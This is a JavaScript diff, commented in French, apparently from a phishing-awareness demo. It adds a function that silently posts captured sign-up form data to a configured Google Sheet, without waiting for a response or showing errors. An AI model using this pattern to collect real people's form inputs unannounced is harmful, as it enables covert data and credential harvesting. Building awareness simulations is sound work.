@@ -47,10 +47,28 @@
       return;
     }
 
-    enregistrerCapture(data);
-    incrementerCompteur();
+    enregistrerCapture(data);     // copie locale (secours / affichage immédiat)
+    incrementerCompteur();        // compteur local (secours)
+    envoyerVersSheet(data);       // envoi vers le Google Sheet (si configuré)
     afficherPiege(data);
   });
+
+  /* ---------- Envoi vers le Google Sheet (stockage central) ----------
+     Fonctionne seulement si window.URL_SHEET est renseignée (config.js).
+     Envoi "fire-and-forget" : on n'attend pas la réponse et une panne
+     réseau ne casse jamais la démo (la copie locale reste disponible). */
+  function envoyerVersSheet(data) {
+    var url = window.URL_SHEET;
+    if (!url) return;
+    try {
+      fetch(url, {
+        method: "POST",
+        mode: "no-cors",
+        headers: { "Content-Type": "text/plain;charset=utf-8" },
+        body: JSON.stringify(data)
+      }).catch(function () {});
+    } catch (err) {}
+  }
 
   /* ---------- Compteur de personnes piégées ----------
      Variable persistante incrémentée à CHAQUE inscription.
